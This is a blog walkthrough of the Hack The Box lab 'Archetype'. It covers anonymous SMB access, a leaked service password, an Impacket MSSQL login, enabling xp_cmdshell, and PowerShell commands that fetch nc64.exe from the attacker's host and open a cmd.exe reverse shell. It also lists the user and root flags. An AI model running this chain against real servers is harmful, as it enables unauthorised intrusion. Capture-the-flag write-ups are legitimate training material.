---
title: "[HTB] Archetype"
author: "Wook Lee"
date: "2024-07-27"
tags: ["Hack The Box"]
---

<div style="text-align: center"><img src="./giphy.gif"></div>

This was the first box in `Tier 2` of the Starting Point. However, I am pretty sure these boxes are not starter boxes because this one was super hard and I honestly would have not finished it without the walkthrough. Since I couldn't finish this box myself, there are going to be some missing points here and there throughout this post. I think it's time for me to start working on the easy boxes from here and maybe come back to the tier 2 boxes later after some time. If I can solve one of those in the future, I will be happy to death and feel so much pride in myself. I believe the day will come very soon.

---

#### Which TCP port is hosting a databse server?

```
1433
```

![alt text](image.png#center)

<br>

#### What is the name of the non-Administrative share available over SMB?

```
backups
```

![alt text](image-1.png#center)

<br>

What is the password identified in the file on the SMB share?

```
M3g4c0rp123
```

After I figured there was a non-administrative share called backups, I tried to connect to the share by running the following command:

`smblcient -N \\\\10.129.95.187\\backups`

The `-N` option is short for 'No Password'

![alt text](image-2.png#center)

On the left tmux pane, I was able to connect to the `backups` share of the SMB server and download the only file `prod.dtsConfig` using the `get` command. On the right tmux pane, I opened up the downloaded file and was able to find the password inside.

<br>

#### What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

```
mssqlclient.py
```

![alt text](image-3.png#center)

**_But What is Impacket?_**

Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.

<br>

We can try to connect to the MSSQL server by using impacket's `mssqlclient.py` script along with the following flags:
`python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth`

`-windows-auth`: this flag is specified to use Windows Authentication

Successfully authenticated to the Microsoft SQL Server

```shell
┌──(kali㉿kali)-[~/Desktop/impacket/examples]
└─$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
Impacket v0.12.0.dev1+20240725.125704.9f36a10e - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

<br>

#### What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

```
xp_cmdshell
```

![alt text](image-4.png#center)

<br>

#### What script can be used in order to search possible paths to escalate privileges on Windows hosts?

```
winPEAS
```

The cheatsheet from pentestmonkey is really helpful that I found how to set up the command execution through the `xp_cmdshell`.
![alt text](image-5.png#center)

```shell
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
ERROR: Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the secur
ity configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp
_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@master)> sp_configure;
```

Now I managed to get a command execution. Let's get a stable reverse shell. We will upload the `nc64.exe` binary to the target machine and execute an interactive `cmd.exe` process on our listening port.

```shell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "whoami"
output
-----------------
archetype\sql_svc

NULL
```

Let's download the binary and navigate to the oflder and then start the simple HTTP sever, then the netcat listener in a different tab.

`python3 -m http.server 80`
`nc -lvnp 443`

<br>

As a user `archetype\sql_svc`, we don't have enough privileges to upload files in a system directory and only user `Administrator` can perform actions with higher privileges. We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.

`SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.14/nc64.exe -outfile nc64.exe`

![alt text](image-6.png#center)

it was confirmed that the target machine indeed performed the request. Let's bind the `cmd.exe` through the `nc` to our listener.

`SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.14 443"`

![alt text](image-7.png#center)

on the right tmux pane, I was able to capture the reverse shell through the netcat.

<br>

#### What file contains the administrator's password?

```
ConsoleHost_history.txt
```

```shell
 Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,716,418,048 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3
C:\Users\sql_svc\Desktop>
```

On the target machine, I used powershell to download the program from my system.
![alt text](image-8.png#center)

![alt text](image-9.png#center)

<br>

#### Submit user flag

```
3e7b102e78218e935bf3f4951fec21a3
```

![alt text](image-10.png#center)

<br>

#### Submit root flag

```
b91ccec3305e98240082d4474b848528
```

<br>

![alt text](image-11.png#center)
